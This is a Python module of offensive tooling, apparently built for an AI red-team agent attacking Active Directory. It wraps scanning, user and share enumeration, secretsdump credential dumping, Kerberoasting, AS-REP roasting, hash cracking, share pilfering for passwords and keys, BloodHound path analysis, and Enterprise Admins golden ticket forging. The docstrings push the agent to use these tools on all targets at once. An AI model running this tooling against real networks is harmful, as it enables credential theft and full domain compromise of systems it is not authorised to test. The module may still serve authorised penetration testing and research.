"""Red Team penetration testing tools for Active Directory environments.

This module provides toolsets for network enumeration, credential harvesting,
password cracking, share pilfering, and golden ticket generation.

All tools execute commands remotely on the Kali attack box via AWS SSM.
"""

import json
import logging
import re
import time
from datetime import datetime, timezone
from typing import Any

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.core.models import (
    Credential,
    Hash,
    Host,
    RedTeamState,
    Share,
    TimelineEvent,
    User,
)
from ares.core.remote import run_remote

logger = logging.getLogger(__name__)


def _run_tool(cmd: list[str], timeout_seconds: int = 300) -> tuple[str, str, int]:
    """Execute a command on the remote Kali attack box.

    Args:
        cmd: Command as list of arguments
        timeout_seconds: Maximum execution time

    Returns:
        Tuple of (stdout, stderr, return_code)
    """
    result = run_remote(cmd, timeout_seconds=timeout_seconds)
    return result.stdout, result.stderr, result.return_code


class NetworkEnumerationTools(Toolset):
    """Tools for network scanning and enumeration."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def nmap_scan(self, target: str) -> str:
        """
        Scans target IPs to discover services, ports, and host information.

        This tool performs a comprehensive network scan to identify:
        - Open ports and running services
        - Service versions
        - Operating system information
        - Domain Controller vs Member Server classification

        Args:
            target: IP addresses to scan (space-separated for multiple targets)

        Returns:
            Detailed nmap scan output showing discovered services and versions

        Example:
            >>> result = nmap_scan("192.168.1.2")
            >>> result = nmap_scan("192.168.1.2 192.168.1.3 192.168.1.4")
        """
        cmd = ["nmap", "-T4", "-sV", "--open"] + target.split(" ")

        try:
            logger.info(f"[*] Scanning targets: {target}")
            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=300)

            if returncode != 0:
                logger.error(f"[!] Nmap scan failed: {stderr}")
                return stderr or f"Nmap scan failed with code {returncode}"

            logger.info(f"[*] Nmap scan completed for target {target}")

            # Track the scanned hosts
            if self.state:
                for ip in target.split():
                    self.state.queried_hosts.add(ip)

            return stdout

        except Exception as e:
            logger.error(f"Scan failed: {e!s}")
            return f"Scan failed: {e!s}"

    @dn.tool_method
    def enumerate_users(self, target: str, username: str, password: str, domain: str = "") -> str:
        """
        Enumerate user accounts on a target using netexec (crackmapexec successor).

        This tool discovers all user accounts in the Active Directory environment,
        which is critical for credential-based attacks and understanding the
        user landscape.

        Args:
            target: IP address or hostname to enumerate
            username: Username for authentication (use empty string for null session)
            password: Password for authentication (use empty string for null session)
            domain: Domain for authentication (optional)

        Returns:
            List of discovered user accounts with details

        Example:
            >>> enumerate_users("192.168.1.100", "user", "pass", "DOMAIN")
            >>> enumerate_users("192.168.1.100", "", "", "")  # null session
        """
        try:
            cmd = ["netexec", "smb", target]

            if username and password:
                cmd.extend(["-u", username, "-p", password])
                if domain:
                    cmd.extend(["-d", domain])
            else:
                cmd.extend(["-u", "", "-p", ""])

            cmd.append("--users")

            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
            logger.info(
                f"[*] User enumeration completed for {target} (user:{username}, domain:{domain})"
            )

            return stdout or stderr

        except Exception as e:
            logger.error(f"User enumeration failed: {e}")
            return f"User enumeration failed for {target}: {e}"

    @dn.tool_method
    def enumerate_shares(
        self, target: str, domain: str = "", username: str = "", password: str = ""
    ) -> str:
        """
        Enumerate SMB shares on a target using netexec.

        This tool discovers network shares which may contain sensitive files,
        credentials, or configuration information critical for privilege escalation.

        Args:
            target: IP address or hostname to enumerate
            domain: Domain for authentication
            username: Username for authentication (use empty string for null session)
            password: Password for authentication (use empty string for null session)

        Returns:
            List of discovered shares with access permissions

        Example:
            >>> enumerate_shares("192.168.1.100", "DOMAIN", "user", "pass")
        """
        try:
            cmd = ["netexec", "smb", target]

            if username and password:
                cmd.extend(["-u", username, "-p", password])
                if domain:
                    cmd.extend(["-d", domain])
            else:
                cmd.extend(["-u", "", "-p", ""])

            cmd.append("--shares")

            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
            logger.info(f"[*] Share enumeration completed for {target}")

            return stdout or stderr

        except Exception as e:
            logger.error(f"Share enumeration failed: {e}")
            return f"Share enumeration failed for {target}: {e}"


class CredentialHarvestingTools(Toolset):
    """Tools for harvesting credentials via Active Directory attacks."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _check_smb_connectivity(self, target: str, timeout_seconds: int = 5) -> tuple[bool, str]:
        """Check if SMB port 445 is reachable on target.

        Args:
            target: Target IP address
            timeout_seconds: Connection timeout for nc command

        Returns:
            Tuple of (is_reachable, error_message)
        """
        cmd = ["nc", "-zv", "-w", str(timeout_seconds), target, "445"]
        try:
            # AWS SSM has a minimum timeout of 30 seconds
            ssm_timeout = max(30, timeout_seconds + 5)
            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=ssm_timeout)
            if returncode == 0:
                return True, ""
            return False, f"SMB port 445 not reachable: {stderr or stdout}"
        except Exception as e:
            return False, f"Connectivity check failed: {e}"

    @dn.tool_method
    def secretsdump(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        dc_ip: str | None = None,
        no_pass: bool = False,
        timeout_minutes: int = 3,
        connection_timeout: int = 30,
        skip_connectivity_check: bool = False,
    ) -> str:
        """
        Extract secrets using impacket-secretsdump for credential harvesting.

        This is one of the most powerful tools for extracting credentials from
        Windows systems. It dumps SAM database, cached credentials, and LSA secrets.
        **CRITICAL: When you have admin access, run this on ALL targets, not just one.**

        Args:
            target: Target IP address or domain name
            username: Username with admin privileges
            password: Password for the username (optional)
            hash: NTLM hash for pass-the-hash authentication (optional)
            domain: Domain name (optional, can be inferred)
            dc_ip: Domain controller IP address (recommended for DC targets to avoid DNS issues)
            no_pass: If True, use Kerberos golden ticket authentication
            timeout_minutes: Maximum time to spend dumping (default: 3)
            connection_timeout: Timeout for initial SMB connection in seconds (default: 30)
            skip_connectivity_check: Skip the SMB port check (default: False)

        Returns:
            Extracted credentials including NTLM hashes, Kerberos keys, and secrets

        Example:
            >>> secretsdump("192.168.1.100", "admin", password="pass")  # pragma: allowlist secret
            >>> secretsdump("192.168.1.100", "admin", hash="aad3b4...")
            >>> secretsdump("domain.local", "admin", no_pass=True)
        """
        # Pre-check SMB connectivity to fail fast
        if not skip_connectivity_check:
            is_reachable, error_msg = self._check_smb_connectivity(target)
            if not is_reachable:
                return f"[!] Target {target} is not reachable on SMB port 445. {error_msg}"

        # Use timeout command to enforce connection-level timeout
        cmd = ["timeout", str(connection_timeout), "impacket-secretsdump"]

        # Add dc-ip flag if provided (helps avoid DNS resolution hangs)
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        if password and domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        elif password and not domain:
            target_string = f"{username}:{password}@{target}"
        elif hash and domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{domain}/{username}@{target}"
        elif hash and not domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{username}@{target}"
        elif no_pass:
            cmd.extend(["-k", "-no-pass"])
            target_string = f"{username}@{target}"
        else:
            return "[!] Error: Either password, hash, or no_pass must be provided"

        cmd.append(target_string)

        # For golden ticket auth, set KRB5CCNAME in the command
        if no_pass:
            cmd = ["env", "KRB5CCNAME=Administrator.ccache"] + cmd

        try:
            logger.info(f"[*] Running secretsdump on {target} with {username}")

            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=timeout_minutes * 60)

            # Check for timeout exit code (124 from timeout command)
            if returncode == 124:
                return (
                    f"[!] Secretsdump timed out after {connection_timeout}s connecting to {target}. "
                    "Target may be unreachable or credentials invalid."
                )

            logger.info(f"[*] Secretsdump completed for {target}")
            return stdout or stderr or f"Secretsdump returned code {returncode}"

        except Exception as e:
            return f"[!] Secretsdump error: {e}"

    @dn.tool_method
    def kerberoast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform Kerberoasting attack to extract service account password hashes.

        Kerberoasting is a technique for extracting Kerberos TGS hashes for accounts
        with Service Principal Names (SPNs). These hashes can be cracked offline to
        obtain service account passwords, which often have elevated privileges.

        Args:
            domain: Target domain (e.g., 'example.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Domain controller IP address

        Returns:
            Kerberos TGS hashes for service accounts that can be cracked offline

        Example:
            >>> kerberoast("example.local", "user", "pass", "192.168.1.100")
        """
        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] Kerberoasting {domain} using {username}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
            return stdout or stderr

        except Exception as e:
            return f"Kerberoasting failed: {e!s}"

    @dn.tool_method
    def asrep_roast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform AS-REP roasting attack to find users without Kerberos pre-authentication.

        AS-REP roasting targets users with "Do not require Kerberos preauthentication"
        enabled. This misconfiguration allows extracting AS-REP hashes that can be
        cracked offline to obtain user passwords.

        Args:
            domain: Target domain (e.g., 'example.local')
            username: Valid domain username (for enumeration)
            password: Password for the username
            dc_ip: Domain controller IP address

        Returns:
            AS-REP hashes for vulnerable user accounts

        Example:
            >>> asrep_roast("example.local", "user", "pass", "192.168.1.100")
        """
        cmd = [
            "impacket-GetNPUsers",
            f"{domain}/{username}:{password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] AS-REP roasting {domain} using {username}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=60)
            return stdout or stderr

        except Exception as e:
            return f"AS-REP roasting failed: {e!s}"

    @dn.tool_method
    def domain_admin_checker(
        self,
        targets: str,
        username: str,
        password: str = "",
        hash: str = "",
    ) -> str:
        """
        Check if a compromised account has domain admin privileges across multiple targets.

        This tool is CRITICAL for identifying domain admin access. When you find an
        Administrator hash or password, IMMEDIATELY use this tool to check ALL targets.
        Look for "Pwn3d!" in the output which indicates administrative access.

        Args:
            targets: Space-separated IP addresses to check
            username: Username for authentication
            password: Password for authentication (optional)
            hash: NTLM hash for pass-the-hash authentication (optional)

        Returns:
            Results showing which targets the account has admin access on

        Example:
            >>> domain_admin_checker("192.168.1.100 192.168.1.101", "Administrator", password="P@ss")  # pragma: allowlist secret
            >>> domain_admin_checker("192.168.1.100 192.168.1.101", "Administrator", hash="aad3b4...")
        """
        try:
            cmd = ["netexec", "smb"] + targets.split(" ")

            if password:
                logger.info(f"[*] Domain admin checker using password for {username}")
                cmd.extend(["-u", username, "-p", password])
            elif hash:
                logger.info(f"[*] Domain admin checker using hash for {username}")
                cmd.extend(["-u", username, "-H", hash])
            else:
                return "[!] Error: Either password or hash must be provided"

            cmd.extend(["-x", "whoami"])

            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)

            output = stdout
            if stderr:
                output += "\n" + stderr if output else stderr

            logger.info(f"[*] Domain admin check completed for {targets}")
            return output

        except Exception as e:
            logger.error(f"Domain admin checker failed: {e}")
            return f"Domain admin checker failed: {e}"


class CrackingTools(Toolset):
    """Tools for password hash cracking."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def crack_with_hashcat(
        self,
        hash_value: str,
        hashcat_mode: int = 13100,
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        max_time_minutes: int = 10,
    ) -> str:
        """
        Attempt to crack a password hash using hashcat (GPU-accelerated).

        Hashcat is faster than John the Ripper when GPU is available. Use this FIRST.
        Common hash modes: NTLM (1000), Kerberos TGS (13100), Kerberos AS-REP (18200).

        **IMMEDIATELY report any successful cracks - don't wait for completion.**

        Args:
            hash_value: Hash to crack
            hashcat_mode: Hashcat mode (-m parameter). Common modes:
                - 1000: NTLM
                - 13100: Kerberos TGS ($krb5tgs$)
                - 18200: Kerberos AS-REP ($krb5asrep$)
            wordlist_path: Path to wordlist file (default: rockyou.txt)
            max_time_minutes: Maximum time to spend cracking (default: 10 minutes)

        Returns:
            Cracked passwords if successful, otherwise error message

        Example:
            >>> crack_with_hashcat("aad3b435b51404ee...", 1000)  # NTLM
            >>> crack_with_hashcat("$krb5tgs$23$*user$...", 13100)  # Kerberos TGS
        """
        output = "[*] Starting hashcat...\n"

        # Create hash file remotely and run hashcat
        hash_file_path = f"/tmp/hash_{time.time()}.hash"  # noqa: S108  # nosec B108

        try:
            # Write hash to remote file and run hashcat
            cmd = f"""
echo '{hash_value}' > {hash_file_path}
hashcat -m {hashcat_mode} -a 0 {hash_file_path} {wordlist_path} --runtime {max_time_minutes * 60} --force 2>&1 || true
hashcat -m {hashcat_mode} {hash_file_path} --show 2>&1
rm -f {hash_file_path}
"""
            stdout, stderr, _ = _run_tool(
                ["bash", "-c", cmd],
                timeout_seconds=(max_time_minutes * 60) + 60,
            )

            if stdout and ":" in stdout:
                output += "\n✓ CRACKED PASSWORDS:\n" + stdout
                logger.info("[+] Hashcat successfully cracked hash")
            else:
                output += "\n✗ No passwords cracked\n" + (stdout or stderr)

            return output

        except Exception as e:
            return output + f"\nError: {e!s}"

    @dn.tool_method
    def crack_with_john(
        self,
        hash_value: str,
        hash_format: str = "krb5asrep",
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        max_time_minutes: int = 10,
    ) -> str:
        """
        Attempt to crack a password hash using John the Ripper (CPU-based).

        Use this as a fallback if hashcat fails or is unavailable. John is CPU-based
        and slower than hashcat, but more compatible with various hash formats.

        Common formats: ntlm, krb5asrep, krb5tgs

        Args:
            hash_value: Hash to crack
            hash_format: John hash format. Common formats:
                - ntlm: NTLM hashes
                - krb5asrep: Kerberos AS-REP hashes
                - krb5tgs: Kerberos TGS hashes
            wordlist_path: Path to wordlist file (default: rockyou.txt)
            max_time_minutes: Maximum time to spend cracking (default: 10 minutes)

        Returns:
            Cracked passwords if successful, otherwise error message

        Example:
            >>> crack_with_john("$krb5asrep$23$user@...", "krb5asrep")
            >>> crack_with_john("aad3b435b51404ee...", "ntlm")
        """
        output = "[*] Starting John the Ripper...\n"

        hash_file_path = f"/tmp/john_hash_{time.time()}.hash"  # noqa: S108  # nosec B108
        session_name = f"john_session_{int(time.time())}"

        try:
            # Write hash to remote file and run john
            cmd = f"""
echo '{hash_value}' > {hash_file_path}
john --wordlist={wordlist_path} --format={hash_format} {hash_file_path} --session={session_name} 2>&1 || true
john --show --format={hash_format} {hash_file_path} 2>&1
rm -f {hash_file_path} {session_name}.pot {session_name}.rec {session_name}.log
"""
            stdout, stderr, _ = _run_tool(
                ["bash", "-c", cmd],
                timeout_seconds=(max_time_minutes * 60) + 60,
            )

            if stdout and ":" in stdout:
                output += "\n✓ CRACKED PASSWORDS:\n" + stdout
                logger.info("[+] John successfully cracked hash")
            else:
                output += "\n✗ No passwords cracked\n" + (stdout or stderr)

            return output

        except Exception as e:
            return output + f"\nError: {e!s}"


class SharePilferingTools(Toolset):
    """Tools for extracting credentials from SMB shares."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def enumerate_share_files(
        self,
        target: str,
        share_name: str,
        username: str,
        password: str,
    ) -> str:
        """
        Recursively enumerate all files in an SMB share to find credential-bearing files.

        This is the FIRST step in share pilfering. Use this to discover interesting files,
        then use download_file_content to examine them. Prioritize files with extensions:
        .ps1, .bat, .cmd, .xml, .ini, .conf, .config

        Args:
            target: Target IP address
            share_name: Name of the SMB share (e.g., 'SYSVOL', 'C$', 'NETLOGON')
            username: Username for authentication
            password: Password for authentication

        Returns:
            Recursive file listing of the share

        Example:
            >>> enumerate_share_files("192.168.1.100", "SYSVOL", "user", "pass")
        """
        share_path = f"//{target}/{share_name}"

        try:
            cmd = [
                "smbclient",
                share_path,
                "-U",
                f"{username}%{password}",
                "-c",
                "recurse ON; ls",
            ]

            logger.info(f"[*] Enumerating files in {share_path}")
            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=120)

            if returncode != 0:
                logger.error(f"[!] Failed to list files: {stderr}")
                return f"Failed to list files: {stderr}"

            return stdout

        except Exception as e:
            logger.error(f"[!] Error during enumeration: {e!s}")
            return f"Error during enumeration: {e!s}"

    @dn.tool_method
    def download_file_content(
        self,
        target: str,
        share_name: str,
        file_path: str,
        username: str,
        password: str,
        max_size_mb: int = 5,
    ) -> str:
        """
        Download and return the content of a file from an SMB share.

        Use this after enumerate_share_files to examine promising files. Look for:
        - Plaintext passwords in PowerShell scripts
        - GPP cpassword values in XML files
        - Connection strings in config files
        - API keys and tokens

        Args:
            target: Target IP address
            share_name: Name of the SMB share
            file_path: Path to the file within the share (e.g., 'scripts/deploy.ps1')
            username: Username for authentication
            password: Password for authentication
            max_size_mb: Maximum file size to download in MB (default: 5)

        Returns:
            Content of the downloaded file

        Example:
            >>> download_file_content("192.168.1.100", "SYSVOL", "Policies/script.ps1", "user", "pass")
        """
        share_path = f"//{target}/{share_name}"

        try:
            cmd = [
                "smbclient",
                share_path,
                "-U",
                f"{username}%{password}",
                "-c",
                f"get {file_path} /dev/stdout",
            ]

            logger.info(f"[*] Downloading {file_path} from {share_path}")
            stdout, stderr, returncode = _run_tool(cmd, timeout_seconds=60)

            if returncode != 0:
                logger.error(f"[!] Failed to download file: {stderr}")
                return f"Failed to download file: {stderr}"

            content = stdout
            logger.info(f"[+] Downloaded {len(content)} bytes from {file_path}")

            # Log that share was accessed
            if self.state:
                logger.info(f"[+] Successfully accessed share {share_name} on {target}")

            return content

        except Exception as e:
            logger.error(f"[!] Error downloading file: {e!s}")
            return f"Error downloading file: {e!s}"


class GoldenTicketTools(Toolset):
    """Tools for Kerberos golden ticket generation and domain escalation."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def get_sid(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str | None = None,
    ) -> str:
        """
        Get the SID (Security Identifier) of a domain.

        This is required for golden ticket generation. You need to get SIDs for BOTH:
        1. The compromised domain (where you have the krbtgt hash)
        2. The target domain (where you want to escalate)

        Args:
            domain: Target domain (e.g., 'subdomain.example.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Optional DC IP address to connect to (recommended to avoid DNS issues)

        Returns:
            Domain SID and list of domain users (look for "[*] Domain SID is: ...")

        Example:
            >>> get_sid("child.example.local", "user", "pass", "192.168.1.100")
            >>> get_sid("parent.example.local", "user", "pass", "192.168.1.101")
        """
        if dc_ip:
            cmd = ["impacket-lookupsid", f"{domain}/{username}:{password}@{dc_ip}"]
            logger.info(f"[*] Getting SID for {domain} using {username} via DC {dc_ip}")
        else:
            cmd = ["impacket-lookupsid", f"{username}:{password}@{domain}"]
            logger.info(f"[*] Getting SID for {domain} using {username}")

        try:
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
            logger.info(f"[*] SID lookup completed for {domain}")
            return stdout or stderr
        except Exception as e:
            return f"Error: {e!s}"

    @dn.tool_method
    def generate_golden_ticket(
        self,
        krbtgt_hash: str,
        domain_sid: str,
        domain: str,
        extra_sid: str,
    ) -> str:
        """
        Generate a Kerberos golden ticket for Administrator to enable domain escalation.

        **This is the ULTIMATE privilege escalation technique.** A golden ticket gives
        you persistent, enterprise-level access to the entire domain forest.

        CRITICAL: The extra_sid should be the target domain SID with "-519" appended
        (Enterprise Admins group). This enables cross-domain privilege escalation.

        Args:
            krbtgt_hash: NTLM hash of the krbtgt account (from secretsdump)
            domain_sid: SID of the compromised domain (from get_sid)
            domain: Domain to generate ticket for (same as domain_sid domain)
            extra_sid: Target domain SID with "-519" appended (Enterprise Admins)

        Returns:
            Golden ticket generation output (saves to Administrator.ccache)

        Example:
            >>> generate_golden_ticket(
            ...     "abc123...",  # krbtgt hash
            ...     "S-1-5-21-123-456-789",  # compromised domain SID
            ...     "child.example.local",  # compromised domain
            ...     "S-1-5-21-111-222-333-519"  # target domain SID + 519
            ... )
        """
        cmd = [
            "impacket-ticketer",
            "-nthash",
            krbtgt_hash,
            "-domain-sid",
            domain_sid,
            "-domain",
            domain,
            "-extra-sid",
            extra_sid,
            "-user-id",
            "500",
            "Administrator",
        ]

        try:
            logger.info("[*] Generating golden ticket for Administrator")
            logger.info(f"[*] Domain: {domain}, SID: {domain_sid}, Extra SID: {extra_sid}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)

            if self.state:
                self.state.has_golden_ticket = True
                # Add timeline event
                event = TimelineEvent(
                    id=f"evt-{len(self.state.timeline):04d}",
                    timestamp=datetime.now(timezone.utc),
                    description=f"Golden ticket generated for {domain}",
                    mitre_techniques=["T1558.001"],  # Golden Ticket
                    confidence=1.0,
                    source="golden_ticket_generation",
                )
                self.state.timeline.append(event)

            return stdout or stderr
        except Exception as e:
            return f"Error: {e!s}"


class BloodHoundTools(Toolset):
    """Tools for ACL enumeration and privilege escalation path discovery."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _parse_bloodhound_output(self, raw_output: str) -> dict[str, Any]:
        """Parse BloodHound collection output for actionable attack paths.

        Returns:
            Dictionary with:
            - attack_paths: List of identified attack paths
            - delegation_targets: Accounts with delegation
            - acl_abuse_targets: Accounts vulnerable to ACL abuse
            - high_value_targets: High-value target accounts
            - recommended_actions: Specific next steps
        """
        result: dict[str, Any] = {
            "attack_paths": [],
            "delegation_targets": [],
            "acl_abuse_targets": [],
            "high_value_targets": [],
            "recommended_actions": [],
            "collection_successful": False,
            "json_files_created": [],
            "raw_output": raw_output,
        }

        # Check for successful collection indicators
        if "Done" in raw_output or "Compressing" in raw_output or ".json" in raw_output:
            result["collection_successful"] = True

        # Parse JSON file outputs
        json_file_pattern = re.findall(r"(\S+\.json)", raw_output)
        result["json_files_created"] = list(set(json_file_pattern))

        # Detect delegation mentions
        if "delegation" in raw_output.lower() or "unconstrained" in raw_output.lower():
            result["delegation_targets"].append(
                {
                    "type": "detected_in_output",
                    "description": "Delegation configuration detected - use find_delegation for details",
                }
            )
            result["recommended_actions"].append(
                {
                    "action": "find_delegation",
                    "priority": "HIGH",
                    "description": "Run find_delegation to identify exploitable delegation configurations",
                    "next_tool": "find_delegation",
                }
            )

        # Detect ACL abuse opportunities
        acl_patterns = [
            "genericall",
            "genericwrite",
            "writedacl",
            "writeowner",
            "forcechangepassword",
        ]
        for pattern in acl_patterns:
            if pattern in raw_output.lower():
                result["acl_abuse_targets"].append(
                    {
                        "type": pattern.upper(),
                        "description": f"{pattern.upper()} ACL abuse opportunity detected",
                    }
                )
                if pattern in ["genericall", "genericwrite"]:
                    result["recommended_actions"].append(
                        {
                            "action": "shadow_credentials",
                            "priority": "CRITICAL",
                            "description": f"Use {pattern.upper()} to add shadow credentials or perform targeted kerberoast",
                            "next_tool": "pywhisker",
                            "alternative_tool": "bloodyAD",
                        }
                    )

        # Detect high-value targets
        high_value_patterns = ["domain admin", "enterprise admin", "administrator", "krbtgt"]
        for pattern in high_value_patterns:
            if pattern in raw_output.lower():
                result["high_value_targets"].append(
                    {
                        "type": pattern.upper(),
                        "description": f"{pattern.upper()} path potentially identified",
                    }
                )

        # Standard recommendations for BloodHound output
        if result["collection_successful"]:
            # Always recommend analyzing for ADCS
            result["recommended_actions"].append(
                {
                    "action": "certipy_find",
                    "priority": "HIGH",
                    "description": "Run certipy_find to check for ADCS vulnerabilities (ESC1-15)",
                    "next_tool": "certipy_find",
                }
            )
            # Add RBCD recommendation if MAQ allows
            result["recommended_actions"].append(
                {
                    "action": "check_rbcd_opportunity",
                    "priority": "MEDIUM",
                    "description": "If GenericWrite on computer, add_computer then rbcd_write for RBCD attack",
                    "next_tool": "add_computer",
                }
            )

        return result

    @dn.tool_method
    def run_bloodhound(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Run BloodHound collection to discover ACL abuse paths and delegation.

        BloodHound reveals hidden privilege escalation opportunities:
        - Users with GenericAll/GenericWrite (shadow credentials, targeted kerberoast)
        - Unconstrained/constrained delegation
        - Shortest paths to Domain Admins
        - ACL-based attack chains

        This tool returns STRUCTURED OUTPUT identifying attack paths and next steps.
        CRITICAL: Run this with ANY valid credentials to find escalation paths.

        Args:
            domain: Target domain (e.g., 'sevenkingdoms.local')
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP address

        Returns:
            Structured output with:
            - collection_successful: Boolean indicating success
            - acl_abuse_targets: Accounts vulnerable to ACL exploitation
            - delegation_targets: Accounts with exploitable delegation
            - recommended_actions: Specific next steps with tool parameters

        Example:
            >>> run_bloodhound("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
        """
        cmd = [
            "bloodhound-python",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            password,
            "-ns",
            dc_ip,
            "-c",
            "All",
        ]

        try:
            logger.info(f"[*] Running BloodHound collection for {domain}")
            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=600)

            raw_output = stdout + "\n" + (stderr or "")

            # Parse output for actionable intelligence
            parsed = self._parse_bloodhound_output(raw_output)

            logger.info("[+] BloodHound collection completed")

            # Build structured response
            output_parts = []
            output_parts.append("=" * 60)
            output_parts.append("BLOODHOUND COLLECTION RESULTS")
            output_parts.append("=" * 60)

            if parsed["collection_successful"]:
                output_parts.append("\n✅ Collection successful!")
                if parsed["json_files_created"]:
                    output_parts.append(
                        f"\n📁 JSON files created: {', '.join(parsed['json_files_created'])}"
                    )
            else:
                output_parts.append("\n⚠️ Collection may have encountered issues")

            if parsed["acl_abuse_targets"]:
                output_parts.append("\n\n🎯 ACL ABUSE OPPORTUNITIES DETECTED:")
                for target in parsed["acl_abuse_targets"]:
                    output_parts.append(f"  - [{target['type']}] {target['description']}")

            if parsed["delegation_targets"]:
                output_parts.append("\n\n🔗 DELEGATION TARGETS DETECTED:")
                for target in parsed["delegation_targets"]:
                    output_parts.append(f"  - {target['description']}")

            if parsed["high_value_targets"]:
                output_parts.append("\n\n👑 HIGH-VALUE TARGETS REFERENCED:")
                for target in parsed["high_value_targets"]:
                    output_parts.append(f"  - {target['type']}")

            if parsed["recommended_actions"]:
                output_parts.append("\n\n📋 RECOMMENDED ACTIONS (Execute in order):")
                for i, action in enumerate(parsed["recommended_actions"], 1):
                    output_parts.append(f"\n  {i}. [{action['priority']}] {action['description']}")
                    output_parts.append(f"     → Use tool: {action['next_tool']}")

            output_parts.append("\n\n📊 STRUCTURED DATA (JSON):")
            output_parts.append(
                json.dumps(
                    {
                        "collection_successful": parsed["collection_successful"],
                        "acl_abuse_targets": parsed["acl_abuse_targets"],
                        "delegation_targets": parsed["delegation_targets"],
                        "high_value_targets": parsed["high_value_targets"],
                        "recommended_actions": parsed["recommended_actions"],
                        "json_files_created": parsed["json_files_created"],
                    },
                    indent=2,
                )
            )

            output_parts.append("\n\n📄 RAW OUTPUT:")
            output_parts.append(raw_output)

            return "\n".join(output_parts)

        except Exception as e:
            logger.error(f"BloodHound failed: {e}")
            return f"BloodHound failed: {e}"


class CertipyTools(Toolset):
    """Tools for Active Directory Certificate Services exploitation."""

    state: RedTeamState | None = None

    def set_state(self, state: RedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _parse_certipy_output(self, raw_output: str) -> dict[str, Any]:  # noqa: PLR0912
        """Parse certipy find output into structured data.

        Returns:
            Dictionary with:
            - vulnerable_templates: List of vulnerable templates with ESC type and details
            - certificate_authorities: List of discovered CAs
            - raw_output: Original output for reference
        """
        result: dict[str, Any] = {
            "vulnerable_templates": [],
            "certificate_authorities": [],
            "exploitable": False,
            "recommended_actions": [],
            "raw_output": raw_output,
        }

        current_ca: str | None = None
        current_template: dict[str, Any] | None = None
        in_template_section = False
        vulnerabilities_found: list[str] = []

        for line in raw_output.split("\n"):
            line_stripped = line.strip()

            # Parse Certificate Authority
            ca_match = re.match(r"CA Name\s*:\s*(.+)", line_stripped)
            if ca_match:
                current_ca = ca_match.group(1).strip()
                result["certificate_authorities"].append(current_ca)
                continue

            # Parse Template Name
            template_match = re.match(r"Template Name\s*:\s*(.+)", line_stripped)
            if template_match:
                if current_template and vulnerabilities_found:
                    current_template["vulnerabilities"] = vulnerabilities_found.copy()
                    result["vulnerable_templates"].append(current_template)
                    vulnerabilities_found = []

                current_template = {
                    "name": template_match.group(1).strip(),
                    "ca": current_ca,
                    "vulnerabilities": [],
                    "enrollee_supplies_subject": False,
                    "client_authentication": False,
                    "enrollment_rights": [],
                }
                in_template_section = True
                continue

            if in_template_section and current_template:
                # Parse ESC vulnerabilities
                esc_match = re.match(r"\[!\]\s*(ESC\d+)\s*:", line_stripped, re.IGNORECASE)
                if esc_match:
                    esc_type = esc_match.group(1).upper()
                    vulnerabilities_found.append(esc_type)
                    continue

                # Alternative ESC format
                if "ESC1" in line_stripped or "ESC2" in line_stripped or "ESC3" in line_stripped:
                    for esc in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC6", "ESC8"]:
                        if esc in line_stripped and esc not in vulnerabilities_found:
                            vulnerabilities_found.append(esc)

                # Parse enrollment rights
                if "Enrollment Rights" in line_stripped:
                    rights_match = re.search(r"Enrollment Rights\s*:\s*(.+)", line_stripped)
                    if rights_match:
                        current_template["enrollment_rights"].append(rights_match.group(1).strip())
                    continue

                # Parse key properties
                if "Enrollee Supplies Subject" in line_stripped and "True" in line_stripped:
                    current_template["enrollee_supplies_subject"] = True
                if "Client Authentication" in line_stripped and "True" in line_stripped:
                    current_template["client_authentication"] = True

        # Don't forget the last template
        if current_template and vulnerabilities_found:
            current_template["vulnerabilities"] = vulnerabilities_found.copy()
            result["vulnerable_templates"].append(current_template)

